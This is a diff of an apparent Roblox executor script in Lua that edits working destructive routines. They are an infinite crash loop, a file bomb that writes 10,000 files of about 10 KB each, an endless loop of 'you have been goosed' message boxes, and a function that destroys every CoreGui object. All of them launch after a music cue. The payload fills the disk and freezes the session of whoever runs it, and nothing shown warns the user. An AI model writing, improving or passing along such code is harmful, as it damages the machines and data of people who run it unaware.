@@ -26,33 +26,27 @@ local function crash()
 	while true do end
 end
 
-local function delete_coregui()
-	task.spawn(function()
-		for _, v in pairs(CoreGui:GetDescendants()) do
-			v:Destroy()
-			print(`Deleting CoreGui Object: {v}`)
-		end
-	end)
-end
-
 local function filebomb()
-	task.spawn(function()
-		local text = ("w"):rep(10000)
-		for i = 1, 10000 do
-			writefile("you have been hacked"..i..".txt", text)
-		end
-	end)
+	local text = ("w"):rep(10000)
+	for i = 1, 10000 do
+		writefile("you have been goosed"..i..".txt", text)
+	end
 end
 
 local function msgbox()
-	task.spawn(function()
-		if messagebox then
-			while true do
-				messagebox("you have been hacked", "you have been hacked", 2+16)
-				task.wait()
-			end
+	if messagebox then
+		while true do
+			messagebox("you have been goosed", "you have been goosed", 2+16)
+			task.wait()
 		end
-	end)
+	end
+end
+
+local function delete_coregui()
+	for _, v in pairs(CoreGui:GetDescendants()) do
+		v:Destroy()
+		print(`Deleting CoreGui Object: {v}`)
+	end
 end
 
 -- Music
@@ -67,9 +61,9 @@ task.wait(_G.Delayed_1)
 Sound:Play()
 task.wait(_G.Delayed_2)
 
-task.spawn(delete_coregui)
 task.spawn(filebomb)
 task.spawn(msgbox)
+task.spawn(delete_coregui)
 
 -- Properties
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
